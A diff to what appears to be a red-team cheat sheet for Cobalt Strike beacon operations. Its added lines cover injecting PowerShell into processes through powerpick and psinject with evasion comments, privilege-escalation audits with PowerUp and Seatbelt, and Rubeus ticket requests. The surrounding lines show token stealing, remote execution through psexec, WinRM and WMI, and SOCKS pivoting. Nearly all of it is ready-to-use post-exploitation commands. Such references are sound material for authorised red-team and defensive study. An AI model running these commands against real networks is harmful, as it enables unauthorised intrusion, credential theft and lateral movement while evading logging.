@@ -38,6 +38,7 @@ If you already has the file you want to host in a web sever just go to `Attacks 
 
 <pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
 execute-assembly </path/to/executable.exe>
+# Note that to load assemblies larger than 1MB, the tasks_max_size property of the malleable profile needs to be modified.
 
 # Screenshots
 printscreen    # Take a single screenshot via PrintScr method
@@ -54,9 +55,14 @@ portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inje
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
 # Powershell
-# Import Powershell module
+## Import Powershell module
 powershell-import C:\path\to\PowerView.ps1
-powershell <just write powershell cmd here>
+powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
+powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
+powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
+powerpick Invoke-PrivescAudit | fl
+psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.
+
 
 # User impersonation
 ## Token generation with creds
@@ -97,6 +103,7 @@ steal_token <pid> #Steal token from process created by mimikatz
 
 ## Pass the ticket
 ## Request a ticket
+execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
 execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
 make_token <domain>\<username> DummyPass
@@ -134,8 +141,8 @@ jump [method] [target] [listener]
 
 remote-exec [method] [target] [command]
 ## Methods:
-<strong>## psexec                          Remote execute via Service Control Manager
-</strong>## winrm                           Remote execute via WinRM (PowerShell)
+## psexec                          Remote execute via Service Control Manager
+## winrm                           Remote execute via WinRM (PowerShell)
 ## wmi                             Remote execute via WMI
 
 ## To execute a beacon with wmi (it isn't ins the jump command) just upload the beacon and execute it
@@ -175,6 +182,15 @@ beacon> socks 1080
 
 # SSH connection
 beacon> ssh 10.10.17.12:22 username password</code></pre>
+
+## Execute-Assembly
+
+`execute-assembly` uses a sacrificial process using remote process injection to execute the indicated .Net program. Howeevr, there are some custom tools that can be used to load something in the same process:
+
+- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
+- [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
+- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
+
 
 ## Avoiding AVs
 
